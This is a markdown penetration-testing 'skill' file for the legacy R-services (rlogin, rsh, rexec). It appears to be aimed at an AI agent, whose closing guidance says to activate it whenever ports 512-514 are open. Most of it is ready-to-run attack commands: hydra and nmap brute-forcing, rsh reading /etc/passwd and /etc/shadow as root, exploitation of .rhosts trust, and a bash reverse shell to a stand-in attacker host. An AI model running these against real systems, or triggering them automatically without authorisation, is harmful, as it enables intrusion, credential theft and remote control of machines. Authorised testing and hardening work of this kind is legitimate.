# Rlogin/RSH/Rexec Pentesting Skill

## Goal

Identify and exploit vulnerabilities in R-services (Rlogin, RSH, Rexec) on ports 512-514.

## Ports

- **512** - Rexec (Remote Execution)
- **513** - Rlogin (Remote Login)
- **514** - RSH (Remote Shell)

## Methodology

1. **Identify Services:** Scan for open ports 512-514
2. **Check Trust Relationships:** Look for .rhosts or hosts.equiv files
3. **Attempt Authentication:** Try trusted host authentication
4. **Exploit Misconfigurations:** Leverage weak trust relationships
5. **Gain Shell Access:** Execute commands or obtain interactive shell

## Enumeration

```bash
# Nmap scan
nmap -sV -p 512,513,514 <target>

# Service identification
nmap -p 512-514 --script=rexec-brute,rlogin-brute <target>
```

## Rlogin (Port 513)

```bash
# Connect with rlogin
rlogin -l root <target>
rlogin -l <username> <target>

# If .rhosts allows, no password needed
```

## RSH (Port 514)

```bash
# Execute command via RSH
rsh <target> -l root id
rsh <target> -l root cat /etc/passwd

# Check for command execution
rsh -l root <target> 'cat /etc/shadow'
```

## Rexec (Port 512)

```bash
# Connect with rexec (requires password)
rexec -l <username> -p <password> <target> id
rexec <target> id
```

## Trust Exploitation

```bash
# Check for .rhosts in home directories
# Contents might be:
+ +                    # Trust all hosts, all users (worst case)
host.example.com root  # Trust specific host
192.168.1.0/24 +       # Trust entire subnet

# Check /etc/hosts.equiv
cat /etc/hosts.equiv
+ +                    # Very dangerous misconfig
```

## Exploitation

```bash
# If trusted, get shell without password
rsh -l root <target> '/bin/bash -i'

# Spawn reverse shell
rsh -l root <target> 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
```

## Brute Force

```bash
# Using hydra for rexec
hydra -l root -P passwords.txt rexec://<target>

# Using nmap scripts
nmap -p 512 --script rexec-brute <target>
nmap -p 513 --script rlogin-brute <target>
```

## Tools

* **rlogin/rsh/rexec** - BSD r-commands
* **Hydra** - Brute force authentication
* **Nmap** - Service detection and brute force scripts

## Guidance for AI

* Activate when ports 512-514 are open during network scan
* R-services use trust-based authentication (.rhosts)
* Very dangerous if misconfigured (+ + in .rhosts)
* Legacy services, often found on older Unix systems
* Should be disabled in favor of SSH
* No encryption - credentials sent in plaintext
